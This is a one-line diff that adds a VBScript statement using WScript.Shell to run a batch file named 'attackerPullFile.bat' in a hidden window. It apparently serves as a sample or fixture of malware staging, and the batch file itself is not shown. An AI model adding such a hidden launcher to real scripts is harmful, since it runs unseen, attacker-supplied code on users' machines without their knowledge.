@@ -1,0 +1,1 @@
+CreateObject("wscript.shell").Run "attackerPullFile.bat", 0, True
